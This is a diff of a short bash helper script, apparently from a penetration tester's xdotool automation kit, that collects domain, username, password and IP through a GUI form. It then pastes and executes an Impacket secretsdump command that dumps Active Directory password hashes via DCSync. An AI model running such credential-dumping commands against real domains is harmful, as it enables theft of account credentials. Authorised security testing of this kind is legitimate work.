@@ -4,15 +4,19 @@
 Impacket: use secretsdump to dump hashes (DCSync)
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+IP_FIELD=$(form_item  "ip" "ip")
+DOMAIN_FIELD=$(form_item  "domain" "domain")
+USERNAME_FIELD=$(form_item  "username" "username")
+PASSWORD_FIELD=$(form_item  "password" "password")
 
-# Generate gui form
-generate_form "Domain"'{"label": "Username", "type": "text", "name": "Username"}'"Password" "ip"
+# Generate GUI form
+generate_form "${IP_FIELD}" "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}"
 
-DOMAIN=${form_data["Domain"]}
-USERNAME=${form_data["Username"]}
-PASSWORD=${form_data["Password"]}
+DOMAIN=${form_data["domain"]}
+USERNAME=${form_data["username"]}
+PASSWORD=${form_data["password"]}
 IP=${form_data["ip"]}
 
 paste_command "secretsdump.py ${DOMAIN}/${USERNAME}:${PASSWORD}@${IP}"
+xdotool key Return
